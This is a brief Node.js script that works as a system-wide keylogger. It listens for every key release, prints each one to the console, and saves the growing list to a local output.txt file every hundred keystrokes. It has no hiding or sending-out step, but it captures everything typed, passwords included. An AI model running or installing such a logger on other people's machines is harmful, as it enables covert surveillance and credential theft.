import { GlobalKeyboardListener } from "node-global-key-listener";
import * as fs from "fs";

const globalKbListener = new GlobalKeyboardListener();

let keyPresses = [];
let keyPressCounter = 0;

// Read the previously logged keys before starting
fs.readFile("./output.txt", "utf-8", (err, data) => {
  if (err) {
    console.log(err);
    console.log("There's probably no output file yet :)");
    return;
  }
  data = data.substring(1).slice(0, -1).split(",");
  data.forEach((e) => keyPresses.push(e.substring(1).slice(0, -1)));
  console.log(keyPresses);
});

// Listen for keypresses and process them
globalKbListener.addListener(function (e, down) {
  if (e.state === "UP") {
    keyPressCounter++;
    console.log(e.name);
    keyPresses.push(e.name);
    if (keyPressCounter >= 100) {
      save();
      keyPressCounter = 0;
    }
  }
});

// Save logged keys to file
function save() {
  fs.writeFile("./output.txt", JSON.stringify(keyPresses), function (err) {
    if (err) {
      return console.log(err);
    }
    console.log("saved!");
  });
}
